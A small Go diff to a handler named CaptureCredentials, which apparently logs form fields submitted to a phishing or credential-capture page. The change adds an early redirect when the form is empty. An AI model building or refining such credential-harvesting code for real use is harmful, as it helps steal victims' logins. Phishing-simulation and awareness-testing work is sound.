@@ -50,6 +50,11 @@ func (h *handlers) CaptureCredentials(w http.ResponseWriter, r *http.Request) {
 		fields[k] = strings.Join(v, ", ")
 	}
 
+	if len(fields) == 0 {
+		http.Redirect(w, r, h.redirectURL, http.StatusFound)
+		return
+	}
+
 	h.log.LogCapture(r, fields)
 
 	if h.notifier != nil {
